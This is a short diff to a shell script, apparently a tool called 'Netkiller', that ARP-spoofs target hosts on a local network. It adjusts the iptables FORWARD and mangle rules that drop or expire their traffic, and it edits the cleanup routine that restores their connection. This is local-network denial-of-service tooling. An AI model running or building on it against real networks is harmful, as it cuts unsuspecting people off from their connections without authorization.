@@ -213,7 +213,7 @@ fi
 
 # iptables policy
 iptables -P FORWARD DROP
-iptables -t mangle -I PREROUTING -i "$INTERFACE" -j TTL --ttl-set 0
+iptables -I FORWARD -j DROP
         
 # Start ARP spoofing for each target
 PIDS=()
@@ -222,8 +222,6 @@ for TARGET in "${TARGETS[@]}"; do
     echo "Netkiller kill the connection of $TARGET"
 
     # Iptables rules
-    iptables -I FORWARD -s "$TARGET" -j DROP
-    iptables -I FORWARD -d "$TARGET" -j DROP
     iptables -t mangle -I FORWARD -s "$TARGET" -j TTL --ttl-set 0
     
     # Bidirectional blocking
@@ -246,7 +244,6 @@ cleanup() {
     iptables -P FORWARD ACCEPT
     iptables -F FORWARD
     iptables -t mangle -F FORWARD
-    iptables -t mangle -F PREROUTING
     echo ""
     echo "Restoring the connection..."
 }
